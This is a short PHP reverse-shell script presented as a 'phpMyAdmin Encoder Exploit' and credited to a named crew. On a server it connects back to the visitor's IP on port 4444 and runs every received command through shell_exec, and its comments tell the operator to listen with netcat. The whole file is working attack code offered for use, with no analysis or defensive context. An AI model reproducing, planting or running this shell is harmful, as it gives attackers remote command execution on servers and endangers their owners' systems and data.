<?php 

#####
# Shell_C0de [phpMyAdmin Encoder Exploit V.1.3+]
# Credit by: N-Cen-Dainamix
#####
# (C) 2016 by: `Dainamix~Team`

# run nc for connect back!!
# command: nc -lvvp [port] || sample: nc -lvvp 4444

@set_time_limit(0); 
$ip = $_SERVER["REMOTE_ADDR"]; 
$port = 4444; # edit port  
$banner = ("########## Shell_C0de [phpMyAdmin Encoder Exploit V.1.3+] ##########"); 
$read = 1337; 
$sockfd = fsockopen($ip,$port,$errno,$errstr); 
if($errno != 0){  print "****** Error Shell ****** $errno:$errstr"; die(0); } 
else if(!$sockfd){ 
    print "Fatal: trying to connect";   } 
else { 
    print "Connecting to: $ip:$port"; 
    fputs($sockfd,$banner); 
    fputs($sockfd, "Connecting Shell Successfull..."); 
while(!feof($sockfd)){ $cmdPrompt = "Shell@" . trim($ip) . ":~# "; 
            fputs($sockfd,$cmdPrompt); $command = trim(fgets($sockfd, $read)); 
                    if(trim($command) == "exit" || $command == "quit")  { 
                        fputs($sockfd ,"Exit Shell .... !!" ); 
                        fclose($sockfd); die(0); } 
                      fputs($sockfd , "" . shell_exec($command) . ""); 
                     } fclose($sockfd); 
    die(0); 
     } 
?>
